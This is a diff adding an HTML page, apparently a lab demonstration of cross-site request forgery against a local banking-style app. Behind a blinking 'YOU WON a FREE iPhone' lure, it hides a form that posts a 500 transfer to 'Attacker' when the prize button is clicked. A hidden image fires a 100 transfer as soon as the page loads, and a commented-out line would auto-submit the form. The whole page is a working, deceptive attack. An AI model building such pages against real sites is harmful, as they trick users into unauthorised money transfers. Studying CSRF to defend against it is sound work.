@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>FREE iPhone!</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            text-align: center;
+            background: #ff00ff;
+            color: white;
+            padding-top: 100px;
+        }
+
+        .win {
+            font-size: 5rem;
+            animation: blink 1s infinite;
+        }
+
+        .prize-btn {
+            font-size: 2rem;
+            padding: 20px;
+            cursor: pointer;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="win">YOU WON a FREE iPhone!!!</div>
+    <h1>Click the button below to claim your prize!</h1>
+
+    <!-- This form is hidden and will be submitted automatically -->
+    <form id="prize-form" action="http://127.0.0.1:5001/transfer" method="POST" style="display:none;">
+        <input type="hidden" name="to" value="Attacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+
+    <button onclick="document.getElementById('prize-form').submit()" class="prize-btn">CLAIM PRIZE</button>
+
+    <!-- Hidden image triggering a GET request (stealthy) -->
+    <img src="http://127.0.0.1:5001/transfer?to=Attacker-Stealth&amount=100" style="display:none;">
+
+    <script>
+        // Automatic exploitation
+        // window.onload = () => { document.getElementById('prize-form').submit(); };
+    </script>
+</body>
+
+</html>
